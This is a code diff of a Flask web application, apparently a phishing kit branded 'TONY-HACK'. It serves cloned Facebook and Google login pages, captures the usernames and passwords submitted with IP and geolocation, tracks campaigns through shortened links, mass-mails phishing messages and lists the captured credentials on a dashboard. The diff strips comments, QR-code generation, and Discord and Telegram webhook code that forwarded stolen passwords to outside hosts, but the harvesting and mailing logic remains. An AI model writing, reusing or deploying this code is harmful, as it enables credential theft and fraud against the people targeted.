@@ -16,14 +16,12 @@ import time
 import re
 import uuid
 import requests
-import qrcode
 import io
 from datetime import datetime, timedelta
 from functools import wraps
 from urllib.parse import urlparse, quote, unquote
 from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_file, make_response
 from werkzeug.utils import secure_filename
-from PIL import Image, ImageDraw, ImageFont
 import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
@@ -76,7 +74,6 @@ def load_data():
     """Maka angona avy amin'ny Gist na session"""
     data = get_gist_content()
     if not data:
-        # Données par défaut
         data = {
             'users': {
                 'admin': {
@@ -158,7 +155,6 @@ def login():
         data = load_data()
         users = data.get('users', {})
         
-        # Vérification du verrouillage
         stats = data.get('stats', {})
         failed = stats.get('failed_logins', {})
         ip = request.remote_addr
@@ -176,18 +172,15 @@ def login():
                     session['user'] = username
                     session['expires_at'] = (datetime.now() + timedelta(minutes=data['settings']['security']['session_timeout'])).isoformat()
                     
-                    # Mise à jour des statistiques
                     user['login_count'] = user.get('login_count', 0) + 1
                     user['last_login'] = datetime.now().isoformat()
                     
-                    # Reset des tentatives échouées
                     if ip in failed:
                         del failed[ip]
                     
                     save_data(data)
                     return jsonify({'success': True, 'redirect': url_for('index')})
             
-            # Échec de connexion
             if ip not in failed:
                 failed[ip] = [1, None]
             else:
@@ -221,7 +214,6 @@ def index():
     total_credentials = len(data.get('credentials', []))
     total_campaigns = len(data.get('campaigns', []))
     
-    # Dernières captures
     recent_captures = sorted(data.get('credentials', []), 
                             key=lambda x: x.get('timestamp', ''), reverse=True)[:5]
     
@@ -249,7 +241,6 @@ def templates():
     data = load_data()
     templates = data.get('templates', [])
     
-    # Types disponibles
     types = ['facebook', 'google', 'instagram', 'linkedin', 'twitter', 
              'netflix', 'paypal', 'airtm', 'alibaba', 'payeer', 'custom']
     
@@ -280,7 +271,6 @@ def statistics():
     data = load_data()
     credentials = data.get('credentials', [])
     
-    # Analyse des données
     stats = {
         'total': len(credentials),
         'unique_ips': len(set(c.get('ip', '') for c in credentials)),
@@ -292,18 +282,15 @@ def statistics():
     }
     
     for cred in credentials:
-        # Pays
         country = cred.get('country', 'Inconnu')
         stats['by_country'][country] = stats['by_country'].get(country, 0) + 1
         
-        # Template
         template_id = cred.get('template_id', 'inconnu')
         template_name = cred.get('template_name', 'Inconnu')
         if template_id not in stats['by_template']:
             stats['by_template'][template_id] = {'name': template_name, 'count': 0}
         stats['by_template'][template_id]['count'] += 1
         
-        # Browser/OS
         ua = cred.get('user_agent', '').lower()
         browsers = ['chrome', 'firefox', 'safari', 'edge', 'opera']
         for browser in browsers:
@@ -311,7 +298,6 @@ def statistics():
                 stats['by_browser'][browser] = stats['by_browser'].get(browser, 0) + 1
                 break
         
-        # OS
         if 'windows' in ua:
             stats['by_os']['Windows'] = stats['by_os'].get('Windows', 0) + 1
         elif 'mac' in ua:
@@ -323,7 +309,6 @@ def statistics():
         elif 'ios' in ua or 'iphone' in ua:
             stats['by_os']['iOS'] = stats['by_os'].get('iOS', 0) + 1
         
-        # Heure
         try:
             hour = datetime.fromisoformat(cred.get('timestamp', '')).hour
             stats['by_hour'][hour] = stats['by_hour'].get(hour, 0) + 1
@@ -374,7 +359,6 @@ def api_templates():
         
         data['templates'].append(new_template)
         
-        # Mise à jour du compteur utilisateur
         user = data['users'].get(session['user'], {})
         user['templates_created'] = user.get('templates_created', 0) + 1
         
@@ -416,12 +400,10 @@ def serve_template(template_id):
         return "Template not found", 404
     
     if request.method == 'POST':
-        # Capture des credentials
         username = request.form.get('username') or request.form.get('email')
         password = request.form.get('password')
         
         if username and password:
-            # Géolocalisation
             ip = request.remote_addr
             geo_info = {'country': 'Inconnu', 'city': 'Inconnu', 'flag': '🌍'}
             
@@ -455,26 +437,21 @@ def serve_template(template_id):
             
             data['credentials'].append(credential)
             
-            # Mise à jour du compteur du template
             for t in data['templates']:
                 if t['id'] == template_id:
                     t['captures'] = t.get('captures', 0) + 1
             
             save_data(data)
             
-            # Envoyer notifications webhook
             send_webhook_notifications(data, credential)
             
-            # Redirection
             redirect_url = get_redirect_url(template.get('type', 'custom'))
             return redirect(redirect_url)
     
-    # Rendre le template
     content = template.get('content', '')
     if not content:
         content = get_default_template(template.get('type', 'custom'))
     
-    # Remplacer les variables
     target = request.args.get('ref', '')
     if target:
         try:
@@ -499,17 +476,12 @@ def api_campaigns():
         campaign_data = request.json
         campaign_id = str(uuid.uuid4())[:8]
         
-        # Créer le lien de tracking
         template_id = campaign_data.get('template_id')
         target_name = campaign_data.get('target_name', '')
         encoded_target = base64.b64encode(target_name.encode()).decode()
         
-        # Raccourcir l'URL
         long_url = f"{BASE_URL}/t/{template_id}?ref={encoded_target}"
         short_url = shorten_url(long_url)
-        
-        # Générer QR code
-        qr_code = generate_qr_code(short_url)
         
         new_campaign = {
             'id': campaign_id,
@@ -523,7 +495,7 @@ def api_campaigns():
             'success_count': 0,
             'fail_count': 0,
             'tracking_url': short_url,
-            'qr_code': qr_code
+            'qr_code': None
         }
         
         data['campaigns'].append(new_campaign)
@@ -561,7 +533,6 @@ def api_send_emails():
                 msg['To'] = target['email']
                 msg['Subject'] = subject
                 
-                # Remplacer les variables
                 personalized_body = email_body.replace('{{nom}}', target.get('name', ''))
                 personalized_body = personalized_body.replace('{{lien}}', tracking_url)
                 personalized_body = personalized_body.replace('{{email}}', target['email'])
@@ -578,7 +549,6 @@ def api_send_emails():
         
         server.quit()
         
-        # Mise à jour de la campagne
         for campaign in data.get('campaigns', []):
             if campaign['id'] == campaign_id:
                 campaign['status'] = 'sent'
@@ -607,7 +577,6 @@ def api_credentials():
         
         credentials = data.get('credentials', [])
         
-        # Filtres
         if search:
             credentials = [c for c in credentials if 
                          search in c.get('username', '').lower() or
@@ -616,10 +585,8 @@ def api_credentials():
         if template_filter:
             credentials = [c for c in credentials if c.get('template_id') == template_filter]
         
-        # Tri
         credentials.sort(key=lambda x: x.get('timestamp', ''), reverse=True)
         
-        # Pagination
         total = len(credentials)
         start = (page - 1) * per_page
         end = start + per_page
@@ -636,7 +603,6 @@ def api_credentials():
         if credential_id:
             data['credentials'] = [c for c in data['credentials'] if c.get('id') != credential_id]
         else:
-            # Supprimer tous
             data['credentials'] = []
         save_data(data)
         return jsonify({'success': True})
@@ -647,53 +613,15 @@ def api_shorten_url():
     url = request.json.get('url')
     service = request.json.get('service', 'tinyurl')
     short_url = shorten_url(url, service)
-    return jsonify({'short_url': short_url, 'qr_code': generate_qr_code(short_url)})
-
-@app.route('/api/webhook/test', methods=['POST'])
-@login_required
-def api_test_webhook():
-    webhook_type = request.json.get('type')
-    webhook_url = request.json.get('url')
-    
-    test_data = {
-        'event': 'test',
-        'message': 'Ceci est un test de webhook TONY-HACK',
-        'timestamp': datetime.now().isoformat()
-    }
-    
-    try:
-        if webhook_type == 'discord':
-            payload = {
-                'embeds': [{
-                    'title': '🔔 Test Webhook TONY-HACK',
-                    'description': 'Webhook configuré avec succès !',
-                    'color': 15295680,
-                    'timestamp': datetime.now().isoformat()
-                }]
-            }
-            response = requests.post(webhook_url, json=payload, timeout=10)
-        else:  # telegram
-            text = f"🔔 *Test Webhook TONY-HACK*\n\n✅ Webhook configuré avec succès !"
-            payload = {'chat_id': webhook_url.split('/')[-1], 'text': text, 'parse_mode': 'Markdown'}
-            response = requests.post(f"https://api.telegram.org/bot{webhook_url.split('/')[-2]}/sendMessage", 
-                                    json=payload, timeout=10)
-        
-        if response.status_code in [200, 204]:
-            return jsonify({'success': True})
-        else:
-            return jsonify({'success': False, 'error': response.text}), 400
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)}), 500
+    return jsonify({'short_url': short_url})
 
 # Fonctions utilitaires
 def get_flag_emoji(country_code):
-    """Convertit un code pays en emoji drapeau"""
     if not country_code:
         return '🌍'
     return ''.join(chr(ord(c) + 127397) for c in country_code.upper())
 
 def shorten_url(long_url, service='tinyurl'):
-    """Raccourcit une URL avec différents services"""
     try:
         if service == 'tinyurl':
             response = requests.get(f'https://tinyurl.com/api-create.php?url={quote(long_url)}', timeout=10)
@@ -707,22 +635,7 @@ def shorten_url(long_url, service='tinyurl'):
         pass
     return long_url
 
-def generate_qr_code(data):
-    """Génère un QR code en base64"""
-    try:
-        qr = qrcode.QRCode(version=1, box_size=10, border=4)
-        qr.add_data(data)
-        qr.make(fit=True)
-        img = qr.make_image(fill_color="black", back_color="white")
-        
-        buffered = io.BytesIO()
-        img.save(buffered, format="PNG")
-        return base64.b64encode(buffered.getvalue()).decode()
-    except:
-        return None
-
 def get_redirect_url(template_type):
-    """Retourne l'URL de redirection selon le type de template"""
     redirects = {
         'facebook': 'https://www.facebook.com/login/',
         'google': 'https://accounts.google.com/',
@@ -738,7 +651,6 @@ def get_redirect_url(template_type):
     return redirects.get(template_type, 'https://www.google.com')
 
 def get_default_template(template_type):
-    """Retourne le template HTML par défaut selon le type"""
     templates = {
         'facebook': '''
             <!DOCTYPE html>
@@ -782,8 +694,6 @@ def get_default_template(template_type):
                 *{margin:0;padding:0;box-sizing:border-box}
                 body{font-family:'Google Sans',Arial,sans-serif;background:#fff}
                 .container{max-width:450px;margin:50px auto;padding:48px 40px}
-                .logo{text-align:center;margin-bottom:30px}
-                .logo img{width:75px}
                 h2{font-size:24px;font-weight:400;margin-bottom:10px}
                 .subtitle{color:#5f6368;margin-bottom:30px}
                 input{width:100%;padding:14px;margin:10px 0;border:1px solid #dadce0;border-radius:4px;font-size:16px}
@@ -794,7 +704,6 @@ def get_default_template(template_type):
             </head>
             <body>
                 <div class="container">
-                    <div class="logo"><img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" style="width:75px"></div>
                     <h2>Connexion</h2>
                     <div class="subtitle">Utiliser votre compte Google</div>
                     <form method="POST">
@@ -810,50 +719,7 @@ def get_default_template(template_type):
     return templates.get(template_type, templates['facebook'])
 
 def send_webhook_notifications(data, credential):
-    """Envoie les notifications webhook"""
-    webhooks = data.get('settings', {}).get('webhooks', {})
-    
-    # Discord webhooks
-    for webhook in webhooks.get('discord', []):
-        if webhook.get('enabled'):
-            try:
-                payload = {
-                    'embeds': [{
-                        'title': '🔑 Nouvelle capture !',
-                        'color': 15295680,
-                        'fields': [
-                            {'name': 'Template', 'value': credential.get('template_name', 'Inconnu'), 'inline': True},
-                            {'name': 'Username', 'value': credential.get('username', 'Inconnu'), 'inline': True},
-                            {'name': 'Password', 'value': f"||{credential.get('password', 'Inconnu')}||", 'inline': True},
-                            {'name': 'IP', 'value': credential.get('ip', 'Inconnu'), 'inline': True},
-                            {'name': 'Pays', 'value': f"{credential.get('flag', '🌍')} {credential.get('country', 'Inconnu')}", 'inline': True},
-                            {'name': 'Cible', 'value': credential.get('target', 'Inconnue'), 'inline': True}
-                        ],
-                        'timestamp': datetime.now().isoformat()
-                    }]
-                }
-                requests.post(webhook['url'], json=payload, timeout=5)
-            except:
-                pass
-    
-    # Telegram webhooks
-    for webhook in webhooks.get('telegram', []):
-        if webhook.get('enabled'):
-            try:
-                text = f"🔑 *Nouvelle capture !*\n\n"
-                text += f"📱 Template: `{credential.get('template_name', 'Inconnu')}`\n"
-                text += f"👤 Username: `{credential.get('username', 'Inconnu')}`\n"
-                text += f"🔐 Password: `{credential.get('password', 'Inconnu')}`\n"
-                text += f"🌐 IP: `{credential.get('ip', 'Inconnu')}`\n"
-                text += f"📍 Pays: {credential.get('flag', '🌍')} {credential.get('country', 'Inconnu')}\n"
-                text += f"🎯 Cible: `{credential.get('target', 'Inconnue')}`"
-                
-                bot_token = webhook['url'].split('/')[-2]
-                chat_id = webhook['url'].split('/')[-1]
-                payload = {'chat_id': chat_id, 'text': text, 'parse_mode': 'Markdown'}
-                requests.post(f'https://api.telegram.org/bot{bot_token}/sendMessage', json=payload, timeout=5)
-            except:
-                pass
+    pass
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)
